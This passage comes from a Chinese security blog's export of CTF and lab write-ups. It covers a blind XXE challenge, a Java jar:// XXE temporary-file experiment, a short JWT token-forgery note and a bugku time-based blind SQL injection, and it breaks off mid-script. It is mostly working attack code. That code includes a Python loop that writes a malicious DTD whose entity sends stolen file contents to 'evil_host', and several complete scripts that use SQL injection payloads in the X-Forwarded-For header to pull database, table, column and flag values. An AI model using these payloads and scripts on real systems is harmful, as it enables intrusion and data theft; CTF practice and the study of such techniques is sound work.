盲注的,大致的思路如下：</p><p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p><p><strong>如图所示：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/PZigmLG.png" alt=""></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/nOLt3zk.png" alt=""></p><p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;52dandan.cc&#x2F;public_html&#x2F;config.php</span><br></pre></td></tr></table></figure><p>拿到第一部分 flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(BASEDIR, &quot;&#x2F;var&#x2F;www&#x2F;52dandan.club&#x2F;&quot;);</span><br><span class="line">define(FLAG_SIG, 1);</span><br><span class="line">define(SECRETFILE,&#39;&#x2F;var&#x2F;www&#x2F;52dandan.com&#x2F;public_html&#x2F;youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&#39;);</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法</p><p>压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);<br>解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);</p><p>然后我们考虑内网有没有东西，我们读取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;etc&#x2F;host</span><br></pre></td></tr></table></figure><p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p><p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;39.107.33.75:33899&#x2F;common.php&#39;</span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">        &quot;name&quot;:&quot;evil_man&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;testabcdefg@gmail.com&quot;,</span><br><span class="line">        &quot;comment&quot;:&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">                &lt;!DOCTYPE root [</span><br><span class="line">                &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;evil_host&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">                %dtd;]&gt;</span><br><span class="line">                &quot;&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(0,28):</span><br><span class="line">        for j in range(48,123):</span><br><span class="line">                f &#x3D; open(&#39;.&#x2F;evil.dtd&#39;,&#39;w&#39;)</span><br><span class="line">            payload2 &#x3D; &quot;&quot;&quot;&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;192.168.223.18&#x2F;test.php?shop&#x3D;3&#39;-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary(&#39;&#123;&#125;&#39;))then(0)else(1)end)-&#39;1&quot;&gt;</span><br><span class="line">                &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;evil_host&#x2F;?result&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">                %all;</span><br><span class="line">                %send;&quot;&quot;&quot;.format(&#39;_&#39;*i+chr(j)+&#39;_&#39;*(27-i))</span><br><span class="line">                f.write(payload2)</span><br><span class="line">                f.close()</span><br><span class="line">                print &#39;test &#123;&#125;&#39;.format(chr(j))</span><br><span class="line">                r &#x3D; s.post(url,data&#x3D;data)</span><br><span class="line">                if &quot;Oti3a3LeLPdkPkqKF84xs&#x3D;&quot; in r.content and chr(j)!&#x3D;&#39;_&#39;:</span><br><span class="line">                        result +&#x3D; chr(j)</span><br><span class="line">                        print chr(j)</span><br><span class="line">                        break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure><p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</p><h3 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a><strong>实验六：文件上传</strong></h3><p>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</p><p><strong>jar:// 协议的格式：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;host&#x2F;application.jar!&#x2F;file&#x2F;within&#x2F;the&#x2F;zip</span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></table></figure><p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</p><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p><blockquote><p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p><p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p></blockquote><p>下面是我的一些测试过程：</p><p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p><p><strong>示例代码：</strong></p><p><strong>xml_test.java</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package xml_test;</span><br><span class="line">import java.io.File;</span><br><span class="line"></span><br><span class="line">import javax.xml.parsers.DocumentBuilder;</span><br><span class="line">import javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"></span><br><span class="line">import org.w3c.dom.Attr;</span><br><span class="line">import org.w3c.dom.Comment;</span><br><span class="line">import org.w3c.dom.Document;</span><br><span class="line">import org.w3c.dom.Element;</span><br><span class="line">import org.w3c.dom.NamedNodeMap;</span><br><span class="line">import org.w3c.dom.Node;</span><br><span class="line">import org.w3c.dom.NodeList;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上</span><br><span class="line"> * @author zhanglong</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class xml_test</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db &#x3D; dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">        Document doc &#x3D; db.parse(new File(&quot;student.xml&quot;));</span><br><span class="line">        &#x2F;&#x2F;获得根元素结点</span><br><span class="line">        Element root &#x3D; doc.getDocumentElement();</span><br><span class="line"></span><br><span class="line">        parseElement(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void parseElement(Element element)</span><br><span class="line">    &#123;</span><br><span class="line">        String tagName &#x3D; element.getNodeName();</span><br><span class="line"></span><br><span class="line">        NodeList children &#x3D; element.getChildNodes();</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&lt;&quot; + tagName);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断</span><br><span class="line">        NamedNodeMap map &#x3D; element.getAttributes();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;如果该元素存在属性</span><br><span class="line">        if(null !&#x3D; map)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int i &#x3D; 0; i &lt; map.getLength(); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;获得该元素的每一个属性</span><br><span class="line">                Attr attr &#x3D; (Attr)map.item(i);</span><br><span class="line"></span><br><span class="line">                String attrName &#x3D; attr.getName();</span><br><span class="line">                String attrValue &#x3D; attr.getValue();</span><br><span class="line"></span><br><span class="line">                System.out.print(&quot; &quot; + attrName + &quot;&#x3D;\&quot;&quot; + attrValue + &quot;\&quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&gt;&quot;);</span><br><span class="line"></span><br><span class="line">        for(int i &#x3D; 0; i &lt; children.getLength(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Node node &#x3D; children.item(i);</span><br><span class="line">            &#x2F;&#x2F;获得结点的类型</span><br><span class="line">            short nodeType &#x3D; node.getNodeType();</span><br><span class="line"></span><br><span class="line">            if(nodeType &#x3D;&#x3D; Node.ELEMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;是元素，继续递归</span><br><span class="line">                parseElement((Element)node);</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nodeType &#x3D;&#x3D; Node.TEXT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;递归出口</span><br><span class="line">                System.out.print(node.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nodeType &#x3D;&#x3D; Node.COMMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.print(&quot;&lt;!--&quot;);</span><br><span class="line"></span><br><span class="line">                Comment comment &#x3D; (Comment)node;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;注释内容</span><br><span class="line">                String data &#x3D; comment.getData();</span><br><span class="line"></span><br><span class="line">                System.out.print(data);</span><br><span class="line"></span><br><span class="line">                System.out.print(&quot;--&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&lt;&#x2F;&quot; + tagName + &quot;&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</p><p><strong>student.xml</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY  remote SYSTEM &quot;jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;wm.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;convert&gt;&amp;remote;&lt;&#x2F;convert&gt;</span><br></pre></td></tr></table></figure><p><strong>目录结构如下图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/SFBWxXl.png" alt=""></p><p>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</p><p><strong>示例代码：</strong></p><p><strong>sever.py</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys </span><br><span class="line">import time </span><br><span class="line">import threading </span><br><span class="line">import socketserver </span><br><span class="line">from urllib.parse import quote </span><br><span class="line">import http.client as httpc </span><br><span class="line"></span><br><span class="line">listen_host &#x3D; &#39;localhost&#39; </span><br><span class="line">listen_port &#x3D; 9999 </span><br><span class="line">jar_file &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">class JarRequestHandler(socketserver.BaseRequestHandler):  </span><br><span class="line">    def handle(self):</span><br><span class="line">        http_req &#x3D; b&#39;&#39;</span><br><span class="line">        print(&#39;New connection:&#39;,self.client_address)</span><br><span class="line">        while b&#39;\r\n\r\n&#39; not in http_req:</span><br><span class="line">            try:</span><br><span class="line">                http_req +&#x3D; self.request.recv(4096)</span><br><span class="line">                print(&#39;Client req:\r\n&#39;,http_req.decode())</span><br><span class="line">                jf &#x3D; open(jar_file, &#39;rb&#39;)</span><br><span class="line">                contents &#x3D; jf.read()</span><br><span class="line">                headers &#x3D; (&#39;&#39;&#39;HTTP&#x2F;1.0 200 OK\r\n&#39;&#39;&#39;</span><br><span class="line">                &#39;&#39;&#39;Content-Type: application&#x2F;java-archive\r\n\r\n&#39;&#39;&#39;)</span><br><span class="line">                self.request.sendall(headers.encode(&#39;ascii&#39;))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:-1])</span><br><span class="line">                time.sleep(30)</span><br><span class="line">                print(30)</span><br><span class="line">                self.request.sendall(contents[-1:])</span><br><span class="line"></span><br><span class="line">            except Exception as e:</span><br><span class="line">                print (&quot;get error at:&quot;+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line"></span><br><span class="line">    jarserver &#x3D; socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    print (&#39;waiting for connection...&#39;) </span><br><span class="line">    server_thread &#x3D; threading.Thread(target&#x3D;jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon &#x3D; True </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure><p>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</p><p>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</p><blockquote><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p></blockquote><p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;1.php</span><br></pre></td></tr></table></figure><p>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</p><p><strong>如下图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/u3U1EPq.png" alt=""></p><p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</p><p><strong>下面是我的实验录屏：</strong></p><img src= "/img/loading.gif" data-src="https://i.imgur.com/8WMGQfV.gif"><p>实验就到这一步了，怎么利用就看各位大佬的了.</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>几个实验都是Korz3n大佬那拿来的</p><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p><p><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">https://www.jianshu.com/p/73cd11d83c30</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/6681114.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/6681114.html</a></p><p><a href="https://m3lon.github.io/2019/01/20/xxe实验踩坑记录/" target="_blank" rel="noopener">https://m3lon.github.io/2019/01/20/xxe%E5%AE%9E%E9%AA%8C%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</a></p><p><a href="https://www.jianshu.com/p/77f2181587a4" target="_blank" rel="noopener">https://www.jianshu.com/p/77f2181587a4</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全漏洞 </category>
          
          <category> RCE漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC | 未知的风险-1</title>
      <link href="/undefined/%5BISCC%5D%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/"/>
      <url>/undefined/%5BISCC%5D%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/</url>
      
        <content type="html"><![CDATA[<p><img src= "/img/loading.gif" data-src="https://i.imgur.com/p3MffHP.png" alt=""></p><p>进入题目：   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/BCfxRDa.png" alt=""></p><p>题目提示user才能进去，抓包得到token       </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/nJHyhmu.png" alt="">     </p><p>然后暴力破解token得到密钥进行伪造token            </p><p>攻击JWT的一些方法：       </p><p><a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全漏洞 </category>
          
          <category> XXE漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT | XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku | insert into</title>
      <link href="/undefined/%5Bbugku%5Dinsert%20into/"/>
      <url>/undefined/%5Bbugku%5Dinsert%20into/</url>
      
        <content type="html"><![CDATA[<p>这道题我觉得还是主要考了编写脚本的能力  </p><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>flag格式：flag{xxxxxxxxxxxx}   </p><p>不如写个Python吧    </p><h4 id="题目直接给出了源码，那就很简单了"><a href="#题目直接给出了源码，那就很简单了" class="headerlink" title="题目直接给出了源码，那就很简单了"></a>题目直接给出了源码，那就很简单了</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>简单分析可以看出服务器读取http头部x-forwarded-for作为ip地址，在将其传给$ip之前，以  ， 为分割符进行分割并取结果数组的第一项。相当于过滤了逗号     </p><p>因为error_reporting(0);关闭了错误报告，没有有效回显，所以使用sleep()时间盲注。    </p><p>构造payload：       </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;+sleep(5)+&#39;</span><br></pre></td></tr></table></figure><p>这道题过滤了 ， 所以脚本如下：</p><p>查库查表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">dic&#x3D; string.ascii_letters + string.digits + string.punctuation    #猜解数据库名称的payload</span><br><span class="line">#string.ascii_leters生成所有字母A-Z,a-z.</span><br><span class="line">#string.ascii_digits生成所有数字0-9</span><br><span class="line">#string.punctuation生成所有标点字符  &#39;!&quot;#$%&amp;\&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\]^_&#96;&#123;|&#125;~&#39;</span><br><span class="line">payload_db &#x3D; &quot;1&#39;+(case when (substr(database() from &#123;0&#125; for 1)&#x3D;&#39;&#123;1&#125;&#39;) then sleep(5) else 1 end)+&#39;&quot; #查询当前数据库名</span><br><span class="line">payload_tb_num &#x3D; &quot;1&#39;+(select case when (select count(*) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;&#123;0&#125;&#39;)&#x3D;&#39;&#123;1&#125;&#39; then sleep(5) else 1 end)+&#39;1&quot; #查询数据库表总数</span><br><span class="line">payload_tb_name_len &#x3D; &quot;1&#39;+(select case when (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;&#123;0&#125;&#39; limit 1 offset &#123;1&#125;) &#x3D; &#39;&#123;2&#125;&#39; then sleep(5) else 1 end)+&#39;1&quot;#查询数据表长度</span><br><span class="line">payload_tb_name &#x3D; &quot;1&#39;+(select case when (substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;&#123;0&#125;&#39; limit 1 offset &#123;1&#125;) from &#123;2&#125; for 1)) &#x3D; &#39;&#123;3&#125;&#39; then sleep(5) else 1 end)+&#39;1&quot;#查询数据表名</span><br><span class="line">payload_col_num &#x3D; &quot;1&#39;+(select case when (select count(*) from  ))&quot;</span><br><span class="line">#查当前数据库</span><br><span class="line">db_name &#x3D; &#39;&#39;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&quot;</span><br><span class="line">for i in range(1,6):</span><br><span class="line">    for j in dic:</span><br><span class="line">        try:</span><br><span class="line">            headers &#x3D; &#123;&#39;x-forwarded-for&#39;:payload_db.format(i,j)&#125;</span><br><span class="line">            res &#x3D; requests.get(url,headers&#x3D;headers,timeout&#x3D;4)</span><br><span class="line">        except requests.exceptions.ReadTimeout:  #服务器在指定时间内没有应答</span><br><span class="line">            print(payload_db.format(i,j))</span><br><span class="line">            db_name +&#x3D; j</span><br><span class="line">            break</span><br><span class="line">print(&#39;db_name: &#39; + db_name)</span><br><span class="line">#查当前数据库有几张表</span><br><span class="line">tb_num &#x3D; 0</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    try:</span><br><span class="line">        headers &#x3D; &#123;&#39;x-forwarded-for&#39;:payload_tb_num.format(db_name,str(i))&#125;</span><br><span class="line">        res &#x3D; requests.get(url,headers&#x3D;headers,timeout&#x3D;4)</span><br><span class="line">    except requests.exceptions.ReadTimeout:</span><br><span class="line">        tb_num &#x3D; i</span><br><span class="line">        print(&#39;tb_num: &#39;+str(i))</span><br><span class="line">        break</span><br><span class="line">#运行后可知有两个表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#表名破解</span><br><span class="line">len &#x3D; 0</span><br><span class="line">#爆破表的长度</span><br><span class="line">for i in range(tb_num):</span><br><span class="line">    for j in range(50):</span><br><span class="line">        try:</span><br><span class="line">            headers &#x3D; &#123;&#39;x-forwarded-for&#39;:payload_tb_name_len.format(db_name,i,j)&#125;</span><br><span class="line">            res &#x3D; requests.get(url,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            len &#x3D; j</span><br><span class="line">            break</span><br><span class="line">    print(&#39;No.&#39;+str(i+1)+&#39; table has length: &#39; + str(len))</span><br><span class="line">    #爆破 表名</span><br><span class="line">    tb_name &#x3D; &#39;&#39;</span><br><span class="line">    for k in range(1,len + 1):</span><br><span class="line">        for j in dic:</span><br><span class="line">            try:</span><br><span class="line">                headers &#x3D; &#123;&#39;x-forwarded-for&#39;:payload_tb_name.format(db_name,i,k,j)&#125;</span><br><span class="line">                res &#x3D; requests.get(url,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">            except requests.exceptions.ReadTimeout:</span><br><span class="line">                print(payload_tb_name.format(db_name,i,k,j))</span><br><span class="line">                tb_name +&#x3D; j</span><br><span class="line">                break</span><br><span class="line">        print(tb_name)</span><br><span class="line">#运行后可知两个表为flag和client_ip</span><br></pre></td></tr></table></figure><p>查字段：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">#数据库</span><br><span class="line">db_name&#x3D;&#39;web15&#39;</span><br><span class="line">#数据表</span><br><span class="line">tb_name&#x3D;&#39;flag&#39;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&quot;</span><br><span class="line">payload_col_num &#x3D; &quot;1&#39;+(select case when (select count(*) from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;&#39;&#123;0&#125;&#39; and TABLE_NAME&#x3D;&#39;&#123;1&#125;&#39;)&#x3D;&#123;2&#125; then sleep(5) else 0 end)+&#39;&quot; #爆字段数</span><br><span class="line">payload_col_len &#x3D; &quot;1&#39;+(select case when (select length(COLUMN_NAME) from information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;&#39;&#123;0&#125;&#39; and TABLE_NAME&#x3D;&#39;&#123;1&#125;&#39; limit 1 offset &#123;2&#125;) &#x3D; &#39;&#123;3&#125;&#39; then sleep(6) else 1 end)+&#39;&quot;</span><br><span class="line">payload_col_name &#x3D; &quot;1&#39;+(select case when (substr((select COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;&#39;&#123;0&#125;&#39; and TABLE_NAME&#x3D;&#39;&#123;1&#125;&#39; limit 1 offset &#123;2&#125;) from &#123;3&#125; for 1)) &#x3D; &#39;&#123;4&#125;&#39; then sleep(6) else 1 end)+&#39;&quot;</span><br><span class="line">dic&#x3D;&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_&#123;&#125;&#39;</span><br><span class="line">#查flag表字段数</span><br><span class="line">col_num &#x3D; 0</span><br><span class="line">for a in range(1,10):</span><br><span class="line">    try:</span><br><span class="line">        headers &#x3D; &#123;&#39;x-forwarded-for&#39;:payload_col_num.format(db_name,tb_name,a)&#125;</span><br><span class="line">        res &#x3D; requests.get(url,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">    except requests.exceptions.ReadTimeout:</span><br><span class="line">        col_num  &#x3D; a</span><br><span class="line">        print (&#39;flag表&#39;+&quot;字段总数为&quot;+str(col_num))</span><br><span class="line">        break</span><br><span class="line">#查flag表字段长度</span><br><span class="line">col_len &#x3D; 0</span><br><span class="line">col_name&#x3D;&#39;&#39;</span><br><span class="line">for b in range(col_num):</span><br><span class="line">    for c in range(50):</span><br><span class="line">        try:</span><br><span class="line">            headers &#x3D; &#123;&#39;x-forwarded-for&#39;:payload_col_len.format(db_name,tb_name,b,c)&#125;</span><br><span class="line">            res &#x3D; requests.get(url,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            col_len &#x3D; c</span><br><span class="line">            print(&#39;No.&#39; + str(b + 1) + &#39; column has length: &#39; + str(col_len))</span><br><span class="line">            break</span><br><span class="line">#查字段名</span><br><span class="line">    for d in range(1, col_len + 1):</span><br><span class="line">        for e in dic:</span><br><span class="line">            try:</span><br><span class="line">                headers &#x3D; &#123;&#39;x-forwarded-for&#39;: payload_col_name.format(db_name, tb_name, b, d, e)&#125;</span><br><span class="line">                res &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)</span><br><span class="line">            except requests.exceptions.ReadTimeout:</span><br><span class="line">                col_name +&#x3D; e</span><br><span class="line">                print(&quot;col_name&#x3D;&quot;+col_name)</span><br><span class="line">                break</span><br><span class="line">print(&#39;col_name: &#39; + col_name)</span><br></pre></td></tr></table></figure><p>查数据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">dic&#x3D;&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_&#123;&#125;&#39;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&quot;</span><br><span class="line">#get content 猜解flag</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">payload_data &#x3D; &quot;1&#39;+(select case when (substr((select flag from flag) from &#123;0&#125; for 1)) &#x3D; &#39;&#123;1&#125;&#39; then sleep(6) else 1 end)+&#39;1&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        try:</span><br><span class="line">            headers &#x3D; 